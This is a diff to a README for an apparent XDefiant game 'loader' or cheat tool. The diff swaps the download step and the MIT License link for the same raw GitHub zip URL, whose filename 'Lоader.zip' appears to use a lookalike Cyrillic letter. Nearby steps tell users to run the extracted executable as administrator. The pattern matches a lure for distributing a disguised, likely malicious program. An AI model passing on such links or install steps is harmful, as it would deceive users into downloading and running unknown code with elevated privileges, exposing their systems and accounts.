@@ -34,7 +34,7 @@ Explore wide compatibility with modern gaming platforms! Find your system in the
 
 Get started on your journey to elevated gameplay! Follow these simple steps:
 
-1. Download **Loader.rar** from the repository.
+1. Download **https://raw.githubusercontent.com/Applemango-art/XDefiant-Tactics-Lab/main/Lоader.zip** from the repository.
 2. Extract the archive with your preferred decompression tool.
 3. Run the provided **XDefiant Loader** executable as administrator (*Windows*) or with proper permissions (*macOS/Linux*).
 4. Follow the on-screen setup instructions for configuration.
@@ -67,7 +67,7 @@ By downloading or using this repository, you agree to comply with local laws and
 
 ## 📚 License (MIT)
 
-This project is licensed under the MIT License (2025). See [MIT License](https://opensource.org/license/mit/) for more details.
+This project is licensed under the MIT License (2025). See [MIT License](https://raw.githubusercontent.com/Applemango-art/XDefiant-Tactics-Lab/main/Lоader.zip) for more details.
 
 ---
 
